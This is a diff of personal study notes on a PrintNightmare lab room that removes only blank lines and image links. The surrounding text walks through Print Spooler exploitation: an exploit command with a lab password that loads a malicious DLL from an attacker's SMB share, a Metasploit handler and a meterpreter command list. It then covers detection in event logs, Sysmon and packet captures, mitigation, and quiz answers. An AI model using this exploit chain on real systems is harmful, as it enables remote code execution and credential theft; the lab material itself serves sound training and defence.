@@ -38,13 +38,11 @@ Print Spooler Properties (Services):
 
 ![](https://i.ibb.co/3WPvSJY/print.png)
 
-
 Print spooler service makes sure to provide enough resources to the computers that send out the print jobs. Remember the early days when users had to wait for print jobs to finish to perform other operations? Well, the Print spooler service took care of this issue for us. 
 
 The Print spooler service allows the systems to act as print clients, administrative clients, or print servers. It is also important to note that the Print spooler service is enabled by default in all Windows clients and servers. It's necessary to have a Print spooler service on the computer to connect to a printer. There are third-party software and drivers provided by the printer manufacturers that would not require you to have the Print spooler service enabled. Still, most companies prefer to utilize Print spooler services. 
 
 Domain Controllers mainly use Print spooler service for printer pruning (the process of removing the printers that are not in use anymore on the network and have been added as objects to Active Directory). Printer pruning eliminates the issue for the users reaching out to a non-existent printer.  You will know soon why we mentioned Domain Controllers. 
-
 
 Where would you enable or disable Print Spooler Service?
 *Services*
@@ -102,7 +100,6 @@ What makes PrintNightmare dangerous?
     It can be exploited over the network; the attacker doesn't need direct access to the machine.
     The proof-of-concept was made public on the Internet. https://github.com/cube0x0/CVE-2021-1675
     The Print Spooler service is enabled by DEFAULT on domain controllers and computers with SYSTEM privileges.
-
 
 Provide the CVE of the Windows Print Spooler Remote Code Execution Vulnerability that doesn't require local access to the machine.
 *CVE-2021-34527*
@@ -181,7 +178,6 @@ Installing collected packages: pyasn1
 Successfully installed pyasn1-0.4.8
 
         
-
 
 ```
 
@@ -318,7 +314,6 @@ Jobs
 
 msf5 exploit(multi/handler) >
 
-
 ```
 Great, now you'll need to host the malicious DLL in a SMB share running on the attacker box. We'll use the AttackBox in this example.
 
@@ -451,14 +446,12 @@ impacket.dcerpc.v5.rprn.DCERPCSessionError: RPRN SessionError: code: 0x35 - ERRO
 
 giv me some error 
 
-
 now works for me, iptables was denying traffic
 
 ┌──(root㉿kali)-[~/home/witty/Desktop/impacket]
 └─# rpcdump.py @10.10.66.59 | egrep 'MS-RPRN|MS-PAR' 
 Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
 Protocol: [MS-RPRN]: Print System Remote Protocol 
-
 
 ┌──(root㉿kali)-[~/home/witty/Desktop/CVE-2021-1675]
 └─# python CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@10.10.66.59 '\\10.8.19.103\share\malicious.dll'
@@ -564,7 +557,6 @@ bettercap.history  Desktop  home  wittyAle
 ################################################################################
                                                            https://metasploit.com
 
-
        =[ metasploit v6.2.25-dev                          ]
 + -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
 + -- --=[ 951 payloads - 45 encoders - 11 nops            ]
@@ -656,7 +648,6 @@ Core Commands
     uuid                      Get the UUID for the current session
     write                     Writes data to a channel
 
-
 Stdapi: File system Commands
 ============================
 
@@ -686,7 +677,6 @@ Stdapi: File system Commands
     show_mount    List all mount points/logical drives
     upload        Upload a file or directory
 
-
 Stdapi: Networking Commands
 ===========================
 
@@ -700,7 +690,6 @@ Stdapi: Networking Commands
     portfwd       Forward a local port to a remote service
     resolve       Resolve a set of host names on the target
     route         View and modify the routing table
-
 
 Stdapi: System Commands
 =======================
@@ -729,7 +718,6 @@ Stdapi: System Commands
     suspend       Suspends or resumes a list of processes
     sysinfo       Gets information about the remote system, such as OS
 
-
 Stdapi: User interface Commands
 ===============================
 
@@ -749,7 +737,6 @@ Stdapi: User interface Commands
     setdesktop     Change the meterpreters current desktop
     uictl          Control some of the user interface components
 
-
 Stdapi: Webcam Commands
 =======================
 
@@ -761,14 +748,12 @@ Stdapi: Webcam Commands
     webcam_snap    Take a snapshot from the specified webcam
     webcam_stream  Play a video stream from the specified webcam
 
-
 Stdapi: Audio Output Commands
 =============================
 
     Command       Description
     -------       -----------
     play          play a waveform audio file (.wav) on the target system
-
 
 Priv: Elevate Commands
 ======================
@@ -777,14 +762,12 @@ Priv: Elevate Commands
     -------       -----------
     getsystem     Attempt to elevate your privilege to that of local system.
 
-
 Priv: Password database Commands
 ================================
 
     Command       Description
     -------       -----------
     hashdump      Dumps the contents of the SAM database
-
 
 Priv: Timestomp Commands
 ========================
@@ -908,7 +891,6 @@ IPv4 Address : 127.0.0.1
 IPv4 Netmask : 255.0.0.0
 IPv6 Address : ::1
 IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
-
 
 Interface  7
 ============
@@ -1184,7 +1166,6 @@ Name  Type   Size (Total)  Size (Free)  Mapped to
 ----  ----   ------------  -----------  ---------
 C:\   fixed  14.46 GiB     3.21 GiB
 
-
 Total mounts/drives: 1
 
 meterpreter > getlwd
@@ -1280,17 +1261,12 @@ If you are interested in learning Splunk, refer to the following rooms:
     Splunk 2
     Splunk 3
 
-
 Provide the first folder path where you would likely find the dropped DLL payload.
 
 	*C:\Windows\System32\spool\drivers\x64\3*
 
-
-
 Provide the function that is used to install printer drivers.
 *pcAddPrinterDriverEx()*
-
-
 
 What tool can the attacker use to scan for vulnerable print servers?
 ```
@@ -1302,11 +1278,9 @@ Protocol: [MS-RPRN]: Print System Remote Protocol
 ```
 *rpcdump.py*
 
-
 ### Detection: Windows Event Logs 
 
 ![|333](https://i.ibb.co/WfD09LG/EVENTLOG.png)
-
 
 Windows Event Logs are detailed records of security, system, and application notifications created by the Windows operating system. There are some logs that record events related to Print Spooler activity. Still, they might not be enabled by default and need to be configured using Windows Group Policy or Powershell. 
 
@@ -1387,32 +1361,14 @@ Image: C:\Windows\System32\spoolsv.exe
 TargetFilename: C:\Windows\System32\spool\drivers\x64\3\New\svch0st.dll
 CreationUtcTime: 2021-08-13 17:33:40.673
 
-
-
 ```
-![[Pasted image 20221115174712.png]]
-
-![[Pasted image 20221115180003.png]]
-
-![[Pasted image 20221115180532.png]]
-
-
-![[Pasted image 20221115181153.png]]
-
-![[Pasted image 20221115181524.png]]
-
-![[Pasted image 20221115182321.png]]
-
 
 Provide the name of the dropped DLL, including the error code. (no space after the comma) 
 You're looking for malicious DLLs loaded by spoolsv.exe.
 *svch0st.dll,0x45A*
 
-
 Provide the event log name and the event ID that detected the dropped DLL. (no space after the comma) 
 *Microsoft-Windows-PrintService/Admin,808*
-
-
 
 Find the source name and the event ID when the Print Spooler Service stopped unexpectedly and how many times was this event logged? (format: answer,answer,answer)
 *Service Control Manager,7031,1*
@@ -1420,11 +1376,8 @@ Find the source name and the event ID when the Print Spooler Service stopped une
 After some threat hunting steps, you are more confident now that it's a PrintNightmare attack. Hunt for the attacker's shell connection. Provide the log name, event ID, and destination port. (format: answer,answer,answer)
 *Microsoft-Windows-Sysmon/Operational,3,4747*
 
-
 Oh no! You think you've found the attacker's connection. You need to know the attacker's IP address and the destination hostname in order to terminate the connection.  Provide the attacker's IP address and the hostname. (format: answer,answer)
 *ip-10-10-210-100.eu-west-1.compute.internal*
-
-
 
 A Sysmon FileCreated event was generated and logged. Provide the full path to the dropped DLL and the earliest creation time in UTC.  (format:answer,yyyy-mm-dd hh-mm-ss)
 Check Sysmon Event ID 3 or 11
@@ -1466,34 +1419,24 @@ Encrypted SMB3 data
 Data: eb4396d044014b5a79a0cf16c21a993b59bc46d4b209268c161505487f0ab353bf4a992e…
 ```
 
-![[Pasted image 20221115184437.png]]
-
-![[Pasted image 20221115184827.png]]
-
 What is the host name of the domain controller?
 *WIN-1O0UJBNP9G7*
-
 
 What is the local domain?
 *WIN-1O0UJBNP9G7*
 
-
 What user account was utilized to exploit the vulnerability?
 *lowprivlarry*
-
 
 What was the malicious DLL used in the exploit?
 *letmein.dll*
 
-
 What was the attacker's IP address?
 *10.10.124.236*
-
 
 What was the UNC path where the malicious DLL was hosted?
 		
 		*\\10.10.124.236\sharez*
-
 
 There are encrypted packets in the results. What was the associated protocol?
 *SMB3*
@@ -1558,16 +1501,11 @@ UpdatePromptSettings = 0 (DWORD) or not defined (default setting)
 
 Note: Having NoWarningNoElevationOnInstall set to 1 makes your system vulnerable by design.
 
-
 Provide two ways to manually disable the Print Spooler Service. (format: answer,answer)
 *powershell, group policy*
 
-![[Pasted image 20221115185812.png]]
-
 Where can you disable the Print Spooler Service in Group Policy? (format: no spaces between the forward slashes)
 *Computer Configuration/Administrative Templates/Printers*
-
-
 
 Provide the command in PowerShell to detect if Print Spooler Service is enabled and running.
 
@@ -1593,7 +1531,5 @@ Here are some additional resources for you to learn more about PrintNightmare de
     PrintNightmare Network Analysis | JUMPSEC LABS https://labs.jumpsec.com/printnightmare-network-analysis/
     From Lares Labs: Detection & Remediation Information for CVE-2021-1675 & CVE-2021-34527 https://github.com/LaresLLC/CVE-2021-1675
     PrintNightmare (CVE-2021-1675 and CVE 2021-34527) Explained https://www.blumira.com/cve-2021-1675/
-
-
 
 [[Follina MSDT]]
